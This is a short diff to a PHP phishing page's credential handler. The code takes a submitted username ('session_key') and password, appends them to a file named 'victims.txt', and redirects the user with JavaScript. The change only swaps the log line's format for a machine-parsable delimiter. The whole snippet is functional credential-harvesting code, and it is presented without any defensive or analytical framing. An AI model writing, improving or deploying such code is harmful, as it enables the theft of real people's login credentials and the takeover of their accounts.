@@ -7,7 +7,7 @@ $u = $_POST['session_key'];
 $p = $_POST['session_password'];
 if ($u){
     $f = fopen('victims.txt','a+');
-    fwrite($f,'USERNAME : '.$u.' PASSWORD : '.$p."\n");
+    fwrite($f,$u.'<!:!>'.$p."\n");
     fclose($f);
     echo '<script>window.location = "'.$r.'"</script>';
 }
